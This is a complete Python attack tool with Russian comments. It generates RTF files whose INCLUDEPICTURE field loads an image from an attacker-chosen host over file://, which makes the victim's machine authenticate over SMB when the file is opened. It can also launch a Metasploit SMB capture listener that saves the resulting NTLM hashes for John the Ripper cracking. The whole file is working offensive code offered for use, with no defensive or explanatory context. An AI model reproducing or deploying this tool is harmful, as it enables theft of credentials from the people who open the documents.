import os
import sys
import time

# Шаблон для создания RTF-документа с вредоносным изображением
template = '{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://[HOST]/[IMAGE]" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}'

# Шаблон для скрипта Metasploit
msf_script_template = '''
use auxiliary/server/capture/smb
set SRVHOST [HOST]
set JOHNPWFILE passwords
run
'''

# Функция для создания скрипта Metasploit
def generateMSFScript(host):
    script = open('metasploit.rc','w')
    script.write(msf_script_template.replace('[HOST]',host))
    script.close()
    print('[+] Script Generated Successfully [+]')

# Функция для запуска слушателя Metasploit
def runListener(host):
    generateMSFScript(host)
    print('[+] Running Metasploit Auxiliary Module [+]')
    os.system('msfconsole -q -r metasploit.rc')

# Функция для генерации RTF-документа с вредоносным изображением
def generateDocument(host,image):
    return template.replace('[HOST]',host).replace('[IMAGE]',image)

# Функция для создания RTF-документа
def writeDocument(content):
    filename = str(int(time.time())) + '.rtf'
    doc = open(filename,'w')
    doc.write(content)
    doc.close()
    print('[+] Generated malicious file: ' + filename + ' [+]')

# Главная функция
def main():
    if(len(sys.argv) < 4): # Проверка количества аргументов командной строки
        print('\nUsage : main.py IP IMAGENAME run_listener \n')
        print('Example: main.py 127.0.0.1 test.jpg 0\n') # Не будет запускать слушатель
        print('Example: main.py 127.0.0.1 test.jpg 1') # Будет запускать слушатель
    else:
        host = sys.argv[1]
        image = sys.argv[2]
        run_msf = sys.argv[3]
        
        if run_msf not in ('0', '1'): # Проверка корректности аргумента для запуска слушателя
            print('\nInvalid value for run_listener. Please provide 0 or 1.\n')
            return

        writeDocument(generateDocument(host,image))
        if(int(run_msf) == 1):
            runListener(host)

    print('\n\n')

if __name__ == "__main__":
    main()  
